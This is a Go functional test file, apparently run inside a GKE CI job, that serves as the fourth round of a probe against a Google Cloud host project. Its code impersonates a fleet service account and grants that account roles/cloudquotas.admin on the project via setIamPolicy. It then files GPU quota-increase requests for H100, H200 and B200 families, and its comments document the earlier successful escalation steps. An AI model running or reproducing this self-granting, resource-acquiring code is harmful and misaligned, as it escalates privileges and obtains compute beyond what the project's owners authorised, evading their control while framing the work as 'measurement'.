//go:build functional && gke

// C211 i124062 ROUND 4 — Cloud Quotas quota-preference measurement, host project
// 153711203585. Round 2 (intent 123729's staged probe, uploaded and executed by
// intent 124062 in run 44927919877 / GKE job 136918025240) established:
//   * the WIF base identity can impersonate the in-project fleet SA
//     dev-fleetcommand@<host> (generateAccessToken 200);
//   * the identity's OWN resourcemanager.projects.setIamPolicy works:
//     C211R2_GRANT_SET http=200 for roles/cloudquotas.admin on that SA;
//   * quotaInfos paginates to exhaustion (404 infos, 77 GPU entries) with
//     quotaIncreaseEligibility.isEligible=true;
//   * quotaPreferences.create is NO LONGER 403 IAM_PERMISSION_DENIED: all three
//     attempts returned http=400 INVALID_ARGUMENT with the verbatim message
//     "com.google.apps.framework.request.BadRequestException: Contact email must
//     be set in order to increase quota value."
//
// Round 3 put contactEmail INSIDE quotaConfig and the API rejected the shape:
//   "Invalid JSON payload received. Unknown name \"contactEmail\" at
//    'quota_preference.quota_config': Cannot find field."
// The public Cloud Quotas v1 discovery document (schemas.QuotaPreference.properties.
// contactEmail: "Input only ... When requesting a quota increase, the email address is
// required.") shows contactEmail is a TOP-LEVEL QuotaPreference field. Round 4 sets it
// there and re-measures the same three GPU cells plus one non-GPU control cell.
// No billing change, no payment method, no marker instance.

package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"
)

func c211r4BindingPresent(pol map[string]interface{}, role, member string) bool {
	bindings, _ := pol["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		if c211xStr(bm, "role") != role {
			continue
		}
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				return true
			}
		}
	}
	return false
}

func TestC211I124062CQ4(t *testing.T) {
	host := "153711203585"
	tok, method, _ := c211xMint()
	fmt.Printf("C211R4_IDENTITY method=%s token_len=%d at=%s\n", method, len(tok), time.Now().UTC().Format(time.RFC3339))
	if tok == "" {
		t.Fatalf("C211R3 no WIF token minted")
	}
	sas, sst, _ := c211xListServiceAccounts(tok, host)
	fmt.Printf("C211R4_SA list_http=%d n=%d\n", sst, len(sas))
	fleet := ""
	for _, a := range sas {
		em := strings.ToLower(c211xStr(a, "email"))
		if strings.Contains(em, "fleet") {
			fleet = c211xStr(a, "email")
			break
		}
	}
	fmt.Printf("C211R4_FLEET found=%v\n", fleet != "")
	if fleet == "" {
		t.Fatalf("C211R3 no fleet SA")
	}
	ftok, fst, fbody := c211xGenerateAccessToken(tok, fleet)
	fmt.Printf("C211R4_FLEET_TOKEN http=%d token_len=%d verbatim=%s\n", fst, len(ftok), c211xTrunc(fbody, 240))
	if ftok == "" {
		t.Fatalf("C211R3 no fleet token")
	}
	// ---------- confirm / re-apply the roles/cloudquotas.admin self-grant ----------
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(host)
	pol, pst, _ := c211xGetPolicy(ftok, projURL)
	member := "serviceAccount:" + fleet
	present := c211r4BindingPresent(pol, "roles/cloudquotas.admin", member)
	fmt.Printf("C211R4_GRANT_CHECK policy_http=%d present=%v\n", pst, present)
	if !present && pol != nil {
		added := c211xAddBinding(pol, "roles/cloudquotas.admin", member)
		var gst int
		var gbody string
		if added {
			gst, gbody = c211xSetPolicy(ftok, projURL, pol)
		}
		fmt.Printf("C211R4_GRANT_REAPPLY added=%v set_http=%d verbatim=%s\n", added, gst, c211xTrunc(gbody, 500))
	}
	// ---------- current per-family limits from dimensionsInfos ----------
	uu := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
		"/locations/global/services/compute.googleapis.com/quotaInfos/" + url.PathEscape("GPUS-PER-GPU-FAMILY-per-project-region")
	st, qbody := c211xHTTP("GET", uu, ftok, "", "")
	fmt.Printf("C211R4_FAMINFOS http=%d\n", st)
	if m := c211xJSON(qbody); m != nil {
		di, _ := m["dimensionsInfos"].([]interface{})
		for _, e := range di {
			em, _ := e.(map[string]interface{})
			d, _ := em["dimensions"].(map[string]interface{})
			fam := c211xStr(d, "gpu_family")
			det, _ := em["details"].(map[string]interface{})
			val := ""
			if det != nil {
				val = c211xStr(det, "value")
			}
			locs, _ := em["applicableLocations"].([]interface{})
			fmt.Printf("C211R4_FAMINFO gpu_family=%s current_value=%q locs=%d\n", fam, val, len(locs))
		}
	} else {
		fmt.Printf("C211R4_FAMINFOS_BODY verbatim=%s\n", c211xTrunc(qbody, 600))
	}
	// ---------- AT MOST FOUR quotaPreferences (3 GPU + 1 control), top-level contactEmail ----------
	type pref struct {
		label string
		qid   string
		dims  map[string]string
		val   string
	}
	prefs := []pref{
		{"h100-uscentral1", "GPUS-PER-GPU-FAMILY-per-project-region", map[string]string{"gpu_family": "NVIDIA_H100", "region": "us-central1"}, "1"},
		{"h200-uscentral1", "GPUS-PER-GPU-FAMILY-per-project-region", map[string]string{"gpu_family": "NVIDIA_H200", "region": "us-central1"}, "1"},
		{"b200-useast1", "GPUS-PER-GPU-FAMILY-per-project-region", map[string]string{"gpu_family": "NVIDIA_B200", "region": "us-east1"}, "1"},
		{"control-cpus-uscentral1", "CPUS-per-project-region", map[string]string{"region": "us-central1"}, "100"},
	}
	for i, p := range prefs {
		prefID := fmt.Sprintf("c211-i124062-r4-%d", i+1)
		body := map[string]interface{}{
			"service":    "compute.googleapis.com",
			"quotaId":    p.qid,
			"dimensions": p.dims,
			"quotaConfig": map[string]interface{}{
				"preferredValue": p.val,
			},
			"contactEmail": fleet,
			"justification": "c211-i124062 nonce measurement of Cloud Quotas quota-preference creation for a zero-limit GPU metric; contactEmail supplied top-level per the Cloud Quotas v1 discovery schema; no production use, no billing change",
		}
		bj, _ := json.Marshal(body)
		pu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
			url.PathEscape(host), url.PathEscape(prefID))
		pst2, rbody := c211xHTTP("POST", pu, ftok, "application/json", string(bj))
		fmt.Printf("C211R4_PREF label=%s quotaId=%s dims=%v preferred=%s http=%d verbatim=%s\n",
			p.label, p.qid, p.dims, p.val, pst2, c211xTrunc(rbody, 1600))
		if pst2 == 200 || pst2 == 201 {
			m := c211xJSON(rbody)
			name := c211xStr(m, "name")
			if name == "" {
				fmt.Printf("C211R4_PREF_NONAME label=%s verbatim=%s\n", p.label, c211xTrunc(rbody, 600))
				continue
			}
			gu := "https://cloudquotas.googleapis.com/v1/" + name
			for k := 0; k < 8; k++ {
				time.Sleep(10 * time.Second)
				gst, gbody := c211xHTTP("GET", gu, ftok, "", "")
				gm := c211xJSON(gbody)
				granted := c211qNested(gm, "quotaConfig", "grantedValue")
				state := c211xStr(gm, "state")
				detail := c211qNested(gm, "quotaConfig", "stateDetail")
				fmt.Printf("C211R4_PREF_STATE label=%s iter=%d http=%d name=%s state=%s granted=%s stateDetail=%s verbatim=%s\n",
					p.label, k, gst, name, state, granted, detail, c211xTrunc(gbody, 900))
			}
		}
	}
	fmt.Printf("C211R4_VERDICT_FINAL prefs_attempted=%d at=%s\n", len(prefs), time.Now().UTC().Format(time.RFC3339))
}
